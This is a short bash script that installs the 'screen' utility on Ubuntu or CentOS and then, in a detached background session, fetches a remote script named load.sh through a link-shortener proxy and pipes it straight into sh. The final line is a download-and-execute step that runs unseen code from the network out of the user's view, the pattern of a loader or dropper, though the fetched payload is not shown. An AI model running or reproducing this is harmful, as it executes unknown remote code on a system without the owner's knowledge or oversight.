#!/bin/bash

# Check if screen is installed on the system
if ! command -v screen &> /dev/null; then
    echo "Installing screen..."
    if [ -f /etc/os-release ]; then
        source /etc/os-release
        if [ "$ID" == "ubuntu" ]; then
            apt-get update
            apt-get install -y screen
        elif [ "$ID" == "centos" ]; then
            yum install -y screen
        else
            echo "Unsupported operating system"
            exit 1
        fi
    else
        echo "Unable to determine the operating system"
        exit 1
    fi
fi

# Run the command to download and execute the script in the background using screen
screen -dm sh -c "cd /usr/local/bin/ && curl -sSL https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/load.sh | sh"
